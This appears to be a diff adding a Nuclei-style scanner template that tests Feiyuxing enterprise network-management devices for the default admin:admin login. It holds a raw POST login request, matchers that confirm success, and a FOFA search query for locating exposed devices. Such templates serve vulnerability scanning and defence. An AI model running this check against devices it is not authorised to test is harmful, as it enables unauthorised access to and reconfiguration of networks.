@@ -1,0 +1,47 @@
+http:
+    - attack: pitchfork
+      matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"msg":"ok"'
+            - '"type":'
+        - part: header
+          type: word
+          words:
+            - hash_key=
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      payloads:
+        password:
+            - admin
+        username:
+            - admin
+      raw:
+        - |
+          POST /send_order.cgi?parameter=login HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          {"username":"{{username}}","password":"{{password}}"}
+id: feiyuxing-default-login
+info:
+    author: SleepingBag945
+    description: |
+        Attackers can log in through admin:admin, check the system status, and configure the device.
+    metadata:
+        fofa-query: title="飞鱼星企业级智能上网行为管理系统"
+        max-request: 1
+        verified: true
+    name: Feiyuxing Enterprise-Level Management System - Default Login
+    reference:
+        - https://github.com/wushigudan/poc/blob/main/%E9%A3%9E%E9%B1%BC%E6%98%9F%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81.py
+    severity: high
+    tags:
+        - feiyuxing
+        - default-login
+        - iot
+        - 飞鱼星企业级智能上网行为管理系统
